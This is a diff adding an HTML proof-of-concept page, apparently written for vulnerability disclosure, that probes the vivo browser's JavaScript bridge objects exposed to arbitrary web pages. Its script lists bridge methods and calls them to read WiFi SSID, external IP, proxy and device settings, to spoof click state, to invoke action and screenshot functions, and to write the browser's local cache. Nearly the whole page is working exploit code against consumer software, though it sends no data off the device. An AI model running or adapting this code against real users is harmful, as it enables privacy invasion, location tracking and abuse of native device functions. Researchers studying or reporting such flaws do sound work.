@@ -1,0 +1,145 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width,initial-scale=1">
+<title>vivo Bridge POC</title>
+<style>
+body{background:#1a1a2e;color:#eee;font-family:monospace;padding:12px;font-size:14px}
+h2{color:#e94560;margin:14px 0 6px;font-size:16px;border-bottom:1px solid #e94560;padding-bottom:4px}
+.box{background:#16213e;border:1px solid #0f3460;border-radius:6px;padding:10px;margin:8px 0}
+.ok{color:#00e676}.fail{color:#ff5252}.warn{color:#ffab40}
+pre{white-space:pre-wrap;word-break:break-all;color:#80cbc4;margin:4px 0}
+#pay-btn{background:#e94560;color:#fff;border:none;padding:12px 24px;border-radius:6px;font-size:16px;margin:10px 0}
+.m{color:#b0bec5;font-size:12px}
+.top{border:2px solid #ffab40;background:#241b00}
+</style>
+</head>
+<body>
+<h2>vivo Browser JS Bridge POC (远程验证版)</h2>
+<div class="box top" id="origin-box"></div>
+<div class="box" id="bridge-check"></div>
+<h2>核心危害一：getEventListeners 越权读取</h2>
+<button id="pay-btn">模拟支付按钮</button>
+<div class="box" id="evt-result"></div>
+<h2>核心危害二：Bridge 方法攻击面枚举</h2>
+<div class="box" id="enum-result"></div>
+<h2>核心危害三：用户配置与设备特征泄露</h2>
+<div class="box" id="info-result"></div>
+<h2>核心危害四：高危原生接口实际调用</h2>
+<div class="box" id="danger-result"></div>
+<h2>写入类接口防护验证</h2>
+<div class="box" id="write-result"></div>
+<script>
+var $=function(id){return document.getElementById(id)};
+document.getElementById('pay-btn').addEventListener('click',function(){alert('支付操作')});
+document.getElementById('pay-btn').addEventListener('touchstart',function(){});
+(function(){
+  var h='<b>当前页面来源证明：</b><br>';
+  h+='<b>Origin：</b><span class="warn">'+location.origin+'</span><br>';
+  h+='<b>href：</b>'+location.href+'<br>';
+  h+='<span class="m">若 Origin 为公网 http(s) 域名且下方对象仍 INJECTED，证明任意远程站点均可调用原生 Bridge</span>';
+  $('origin-box').innerHTML=h;
+})();
+(function(){
+  var b=['vivocontrol','vivoChameleonColor','vivoDiagnosticScheduler','vivoPrefetchUrlsManager','vivoTranslate','onappinstalled'];
+  var h='<b>Bridge 对象检测：</b><br>',n=0;
+  b.forEach(function(k){var e=typeof window[k]!=='undefined';if(e)n++;h+='<span class="'+(e?'ok':'fail')+'">'+k+':'+(e?'INJECTED':'missing')+'</span> ';});
+  h+='<br><b>共发现 '+n+' 个注入对象</b>';
+  $('bridge-check').innerHTML=h;
+})();
+setTimeout(function(){
+  var el=$('pay-btn');
+  var h='<b>目标元素：</b>#pay-btn<br><b>标准 addEventListener 绑定：</b>click, touchstart<br><br>';
+  try{
+    var r=vivocontrol.getEventListeners(el);
+    var s=JSON.stringify(r,null,2);
+    h+='<b>vivocontrol.getEventListeners() 返回：</b><pre>'+s+'</pre>';
+    if(r && Object.keys(r).length>0){h+='<span class="warn">跨源读取成功，已获取事件绑定详情！</span>';}
+    else{h+='<span class="fail">返回空对象，未获取到标准事件（vivo 已通过 canGetEventListeners 开关拦截）</span>';}
+  }catch(e){h+='<span class="fail">异常:'+e.message+'</span>';}
+  $('evt-result').innerHTML=h;
+},400);
+setTimeout(function(){
+  var targets=['vivocontrol','vivoChameleonColor','vivoDiagnosticScheduler','vivoPrefetchUrlsManager','vivoTranslate'];
+  var h='',total=0;
+  targets.forEach(function(name){
+    if(typeof window[name]==='undefined')return;
+    var methods=[];
+    try{
+      var obj=window[name];
+      while(obj && obj!==Object.prototype){
+        Object.getOwnPropertyNames(obj).forEach(function(k){
+          if(methods.indexOf(k)===-1){
+            var desc=Object.getOwnPropertyDescriptor(obj,k);
+            var type=(typeof obj[k]==='function')?'fn':(desc&&desc.get?'getter':'prop');
+            methods.push(k+' ('+type+')');
+          }
+        });
+        obj=Object.getPrototypeOf(obj);
+      }
+    }catch(e){h+='<b>'+name+'</b> => <span class="fail">枚举失败:'+e.message+'</span><br>';return;}
+    total+=methods.length;
+    h+='<b>'+name+'</b> 暴露成员 <span class="ok">'+methods.length+'</span> 个：<pre>'+methods.sort().join('\n')+'</pre>';
+  });
+  h='<b>合计可枚举成员：'+total+' 个</b><br><span class="warn">任意第三方页面均可枚举并调用上述原生能力</span><br><br>'+h;
+  $('enum-result').innerHTML=h;
+},700);
+setTimeout(function(){
+  var a=[
+    ['vivocontrol.getTextZoom',function(){return vivocontrol.getTextZoom()}],
+    ['vivocontrol.getFeaturesType',function(){return vivocontrol.getFeaturesType()}],
+    ['vivocontrol.getFeatureSupportMode',function(){return vivocontrol.getFeatureSupportMode()}],
+    ['vivocontrol.getWebViewType',function(){return vivocontrol.getWebViewType()}],
+    ['vivocontrol.getHighModel',function(){return vivocontrol.getHighModel()}],
+    ['vivocontrol.isNightMode',function(){return vivocontrol.isNightMode()}],
+    ['vivocontrol.imagesEnable',function(){return vivocontrol.imagesEnable()}],
+    ['vivocontrol.canGetEventListeners',function(){return vivocontrol.canGetEventListeners()}],
+    ['vivocontrol.searchSummaryReportEnable',function(){return vivocontrol.searchSummaryReportEnable()}],
+    ['vivoDiagnosticScheduler.getNetworkStatus',function(){return vivoDiagnosticScheduler.getNetworkStatus()}],
+    ['vivoDiagnosticScheduler.isXSpace',function(){return vivoDiagnosticScheduler.isXSpace()}]
+  ];
+  var h='',ok=0;
+  a.forEach(function(i){
+    try{var v=i[1]();if(v!=null)ok++;h+='<b>'+i[0]+'()</b> => <span class="'+(v!=null?'ok':'fail')+'">'+JSON.stringify(v)+'</span><br>';}
+    catch(e){h+='<b>'+i[0]+'()</b> => <span class="fail">ERROR:'+e.message+'</span><br>';}
+  });
+  h='<b>成功读取 '+ok+' / '+a.length+' 项</b><br><br>'+h;
+  $('info-result').innerHTML=h;
+},1000);
+setTimeout(function(){
+  var cases=[
+    ['获取公网IP',function(){return vivoDiagnosticScheduler.getExternalIp()}],
+    ['启动IP探测',function(){return vivoDiagnosticScheduler.startGetExternalIp()}],
+    ['读取WiFi名称',function(){return vivoDiagnosticScheduler.getWifiSSID()}],
+    ['WiFi状态',function(){return vivoDiagnosticScheduler.getWifiStatus()}],
+    ['代理名称',function(){return vivoDiagnosticScheduler.getProxyName()}],
+    ['代理状态',function(){return vivoDiagnosticScheduler.getProxyStatus()}],
+    ['信号强度',function(){return vivoDiagnosticScheduler.getSignalStrengthLevel()}],
+    ['伪造点击状态',function(){return vivocontrol.setSimulateClicked(true)}],
+    ['万能动作分发',function(){return vivocontrol.doAction('poc')}],
+    ['截图能力探测',function(){return vivocontrol.captureToNative('poc')}]
+  ];
+  var h='',ok=0;
+  cases.forEach(function(c){
+    try{var v=c[1]();if(v!=null&&v!=='')ok++;h+='<b>'+c[0]+'</b> => <span class="ok">'+JSON.stringify(v)+'</span><br>';}
+    catch(e){h+='<b>'+c[0]+'</b> => <span class="fail">ERROR:'+e.message+'</span><br>';}
+  });
+  h='<b>成功调用 '+ok+' / '+cases.length+' 个高危接口</b><br><span class="m">getWifiSSID / getExternalIp 若返回真实值即坐实地理位置追踪</span><br><br>'+h;
+  $('danger-result').innerHTML=h;
+},1400);
+setTimeout(function(){
+  var h='';
+  try{
+    var w=vivocontrol.setLocalCache('poc_test','hacked');
+    h+='<b>setLocalCache</b> => <span class="warn">'+JSON.stringify(w)+'</span> <span class="m">(未抛异常，调用被执行)</span><br>';
+    var r=vivocontrol.getLocalCache('poc_test');
+    h+='<b>getLocalCache</b> => <span class="fail">'+JSON.stringify(r)+'</span><br>';
+    if(!r){h+='<span class="m">写入被静默丢弃，存在来源校验但采用静默失败而非拒绝调用</span>';}
+    else{h+='<span class="warn">写入成功，第三方页面可篡改浏览器缓存！</span>';}
+  }catch(e){h+='<span class="fail">异常:'+e.message+'</span>';}
+  $('write-result').innerHTML=h;
+},1700);
+</script>
+</body>
+</html>
